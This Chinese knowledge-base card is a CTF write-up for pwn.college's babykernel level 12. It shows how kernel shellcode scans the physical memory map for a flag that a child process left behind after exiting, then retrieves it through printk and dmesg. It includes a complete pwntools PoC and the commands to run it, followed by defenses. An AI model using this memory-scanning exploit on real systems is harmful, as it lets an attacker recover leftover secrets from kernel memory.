---
id: binary-pwn-kernel-egg-hunter-physical-memory-scan
title: Egg Hunter 扫描物理内存残留：子进程退出后按 2GB 物理映射找 flag
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-egg-hunter-physical-memory-scan
aliases:
- Egg Hunter
- 物理内存扫描
- 内存残留 flag
- 18446612682070032384
- pwn.college level 12
tags:
- kernel
- pwn
- egg-hunter
- physical-memory
- residual
- flag
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:50:48+08:00'
  notes: 已对照原文核对代码/地址/偏移与利用链，一致；原文为 pwn.college 教学环境，卡内已标注地址偏移依赖具体内核版本/配置，未复跑 PoC。
---

## 一句话结论

当子进程读取 `/flag` 后立即退出、用户页表被销毁但物理页不会主动清零时，可在内核 shellcode 中从直接物理映射基址 `0xffff888000000000` 开始扫描 2GB，匹配 flag 前缀（如 `college{`），再用 `printk` 输出匹配到的字符串，从 dmesg 取回 flag。

## 原理

- **flag 曾存在于子进程用户页**：`load_flag()` fork 子进程，子进程 `open("/flag")`、`read` 到全局 `flag_23549`，然后 `exit(0)`；父进程 `wait` 后继续。子进程退出会释放用户页表/页面，但 Linux 默认不会在 free 时清零物理页（除非 `init_on_free`），数据残留在物理内存。
- **直接物理映射**：x86_64 Linux 将物理内存线性映射到 `page_offset_base`，默认 `0xffff888000000000`（KASLR 可能随机化）；本题 VM 2GB，映射范围 `0xffff888000000000 ~ 0xffff888080000000`。
- **Egg Hunter**：在物理映射区间逐字节/逐页扫描，查找 flag 标记（`college{` 或 `pwn.college{`）；找到后用 `printk("%s", ptr)` 输出，再继续扫描/退出。因为 flag 是文本，直接按字节匹配即可。
- **为什么可行**：物理页重用前不会清零；`0xffff888000000000` 可直接解引用（内核态）；`printk` 把结果写入 dmesg，用户态 `dmesg`/`klogctl` 读取。
- **本题注意**：不要用 pwntools/Python 与 challenge 交互，因为 Python 进程的 `sendline`/字符串处理会分配/释放内存，可能覆盖刚释放的 flag 物理页；应生成 `shellcode.bin`，用 shell `cat shellcode.bin | /challenge/...` 喂给程序，减少内存扰动。
- **边界**：需要内核代码执行；物理映射基址/KASLR/内存大小需按环境调整；若 `init_on_free=1`、内存加密或页面被快速重用，残留可能被清零/覆盖。

## 触发条件

- 子进程读取 flag 后立即退出，父进程继续执行并可触发内核 shellcode。
- 内核未启用 `init_on_free`/内存清零，物理页残留可读。
- 知道直接物理映射基址与 VM 内存大小（本题 `0xffff888000000000` + 2GB）。
- 有内核代码执行原语（模块 RWX + write shellcode）；`printk` 地址已知。
- 用户态交互工具不会大量分配内存覆盖残留页（用 shell 管道而非 pwntools）。

## 利用步骤

1. 分析用户程序，确认子进程读 flag 后 `exit`，父进程 `wait` 后继续；flag 只在子进程用户空间。
2. 确认直接物理映射基址（`page_offset_base`，无 KASLR 时通常 `0xffff888000000000`）与 VM 内存大小（本题 2GB）。
3. 编写内核 shellcode：`rdi=0xffff888000000000`、`rsi=rdi+0x80000000`，逐字节比较标记 `college{`；命中则 `printk("%s", rdi)`，继续扫描；扫描完 `ret`。
4. 编写用户 shellcode：把内核 shellcode 通过允许的 `write` 写到设备 fd 3；用 pwntools 汇编生成 `shellcode.bin`。
5. 用 shell 管道执行：`cat shellcode.bin | /challenge/babykernel_level12.0`，避免 Python 进程扰动内存。
6. `dmesg | grep pwn.college` 读取 flag；若没有，调整扫描范围/标记/内存大小。

## PoC

```python
from pwn import *
context.arch = 'amd64'

kernel_sc = asm("""
    mov rdi, 0xffff888000000000
    mov rsi, 0xffff888080000000
    mov rbx, [rip + mark]
scan_loop:
    cmp rdi, rsi
    jge done
    cmp rbx, [rdi]
    je found
    inc rdi
    jmp scan_loop
found:
    push rdi
    push rsi
    push rbx
    mov rsi, rdi
    lea rdi, [rip + fmt]
    mov rax, 0xffffffff810b69a9   /* printk */
    call rax
    pop rbx
    pop rsi
    pop rdi
    inc rdi
    jmp scan_loop
done:
    ret
mark:
    .ascii "college{"
fmt:
    .asciz "%s\\n"
""")

user_sc = asm(f"""
    mov rdi, 3
    lea rsi, [rip + kernel_sc]
    mov rdx, {len(kernel_sc)}
    mov rax, 1
    syscall
    ret
kernel_sc:
    .byte {','.join(hex(b) for b in kernel_sc)}
""")
open("shellcode.bin", "wb").write(user_sc)
```

说明：地址/内存范围来自原文 pwn.college level 12 环境；`0xffff888000000000` 为无 KASLR 的直接物理映射基址。PoC 未在本机复跑。

## 变体与关联

- **按页扫描**：逐字节太慢可每 8 字节/页扫描，或用 `memchr`/SIMD；flag 可能跨页，需处理边界。
- **其他残留**：堆残留、slab 残留、内核日志/dmesg 残留；参见 [[ctf-pwn-heap-residual-uninitialized-read-flag]]。
- **子进程仍运行**：改用 [[binary-pwn-kernel-access-process-vm-task-children-read]] 读子进程内存。
- **KASLR**：物理映射基址可能随机化，需先泄露 `page_offset_base`。

## 检测与防御

- **清零策略**：启用 `init_on_free=1`/`init_on_alloc=1`、内存加密；敏感数据读取后立即清零并释放。
- **不驻留**：flag 读入后不要长期放在可被扫描的物理页；使用 `mlock`+清零、及时退出。
- **内核加固**：KASLR、SMEP/SMAP、W^X、模块签名；防止内核代码执行是根本。
- **检测**：监控内核模块/可执行内存、异常物理内存扫描（大量页访问）、dmesg 异常 printk；对 `/proc/<device>` 写 shellcode 告警。
